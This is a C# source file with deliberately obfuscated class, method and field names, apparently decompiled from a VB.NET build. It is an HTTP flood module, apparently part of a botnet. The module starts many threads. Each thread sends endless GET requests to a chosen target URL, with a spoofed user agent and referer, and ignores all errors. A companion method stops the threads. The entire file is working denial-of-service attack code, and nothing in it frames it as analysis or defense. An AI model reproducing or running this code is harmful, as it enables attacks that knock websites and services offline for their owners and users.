using System;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class wXicurPkJBxJaoKxHfaDFlG
{
	private class gjbzPIrZcwZdrCXkXKlIGiQ
	{
		private string smFoLuFLHTkyHIRojNPvCVd;

		private string TytusxipwNnnDtvnNpUSzoJ;

		private string zqEPxwkkMUgJcIfxKxvpIFb;

		private WebClient LWbYjBCXYhGmQfMSltjPKLJ;

		private int OyrzdFpGKMEdGkVRFZQHVfO;

		public gjbzPIrZcwZdrCXkXKlIGiQ(string NBnOkwLsKwBaOMGYVrOmsoz, int DSnoyIDgvPiCwlRabZePJQt, string HGWadUtJBlTVqTXlvQeREeB, string zcJbNRqRcWolIeDuqDTiErB)
		{
			LWbYjBCXYhGmQfMSltjPKLJ = new WebClient();
			smFoLuFLHTkyHIRojNPvCVd = NBnOkwLsKwBaOMGYVrOmsoz;
			OyrzdFpGKMEdGkVRFZQHVfO = DSnoyIDgvPiCwlRabZePJQt;
			TytusxipwNnnDtvnNpUSzoJ = HGWadUtJBlTVqTXlvQeREeB;
			zqEPxwkkMUgJcIfxKxvpIFb = zcJbNRqRcWolIeDuqDTiErB;
		}

		public void Send()
		{
			while (true)
			{
				try
				{
					if (!epHIdfoMsWmTZsBpVRRPUGy)
					{
						LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add("GET: " + smFoLuFLHTkyHIRojNPvCVd + " HTTP/1.1");
					}
					else
					{
						LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add("POST: " + smFoLuFLHTkyHIRojNPvCVd + " HTTP/1.1");
					}
					LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add(HttpRequestHeader.UserAgent, TytusxipwNnnDtvnNpUSzoJ);
					LWbYjBCXYhGmQfMSltjPKLJ.Headers.Add(HttpRequestHeader.Referer, zqEPxwkkMUgJcIfxKxvpIFb);
					LWbYjBCXYhGmQfMSltjPKLJ.DownloadString(smFoLuFLHTkyHIRojNPvCVd);
					Thread.Sleep(OyrzdFpGKMEdGkVRFZQHVfO);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Thread.Sleep(OyrzdFpGKMEdGkVRFZQHVfO);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] LTJoxxwCYfmRedtwzrQfYIq;

	private static Thread[] sNpuIFnBaaCKXySxWnOnysL;

	public static string uRBMSOZqFNOYvqUVCJbjZFz;

	public static string ByEpvDTutKzDtTvbZHvQGwL;

	public static string VEEqqSanPjOmEQFCvOLhRci;

	public static bool epHIdfoMsWmTZsBpVRRPUGy;

	public static int GkLwMQTLjNrbXMgWNblUUHt;

	public static bool VqESzRDHgVSMebyUsyuHKYt;

	private static gjbzPIrZcwZdrCXkXKlIGiQ[] vFPJmDVpJDsYhhgkWPWBNNd;

	public static int hTXwXicurPkJBxJaoKxHfaD;

	public static void FlGLTJoxxwCYfmRedtwzrQf()
	{
		checked
		{
			sNpuIFnBaaCKXySxWnOnysL = new Thread[hTXwXicurPkJBxJaoKxHfaD - 1 + 1];
			LTJoxxwCYfmRedtwzrQfYIq = new ThreadStart[hTXwXicurPkJBxJaoKxHfaD - 1 + 1];
			vFPJmDVpJDsYhhgkWPWBNNd = new gjbzPIrZcwZdrCXkXKlIGiQ[hTXwXicurPkJBxJaoKxHfaD - 1 + 1];
			if (!uRBMSOZqFNOYvqUVCJbjZFz.StartsWith("http://"))
			{
				uRBMSOZqFNOYvqUVCJbjZFz = "http://" + uRBMSOZqFNOYvqUVCJbjZFz;
			}
			int num = hTXwXicurPkJBxJaoKxHfaD - 1;
			for (int i = 0; i <= num; i++)
			{
				vFPJmDVpJDsYhhgkWPWBNNd[i] = new gjbzPIrZcwZdrCXkXKlIGiQ(uRBMSOZqFNOYvqUVCJbjZFz, GkLwMQTLjNrbXMgWNblUUHt, ByEpvDTutKzDtTvbZHvQGwL, VEEqqSanPjOmEQFCvOLhRci);
				LTJoxxwCYfmRedtwzrQfYIq[i] = vFPJmDVpJDsYhhgkWPWBNNd[i].Send;
				sNpuIFnBaaCKXySxWnOnysL[i] = new Thread(LTJoxxwCYfmRedtwzrQfYIq[i]);
				sNpuIFnBaaCKXySxWnOnysL[i].Start();
			}
			VqESzRDHgVSMebyUsyuHKYt = true;
		}
	}

	public static void SCjmHjnCxhuUUuEQsMrPhHh()
	{
		checked
		{
			int num = hTXwXicurPkJBxJaoKxHfaD - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					sNpuIFnBaaCKXySxWnOnysL[i].Abort();
					sNpuIFnBaaCKXySxWnOnysL[i] = null;
					LTJoxxwCYfmRedtwzrQfYIq[i] = null;
					vFPJmDVpJDsYhhgkWPWBNNd[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			VqESzRDHgVSMebyUsyuHKYt = false;
		}
	}
}
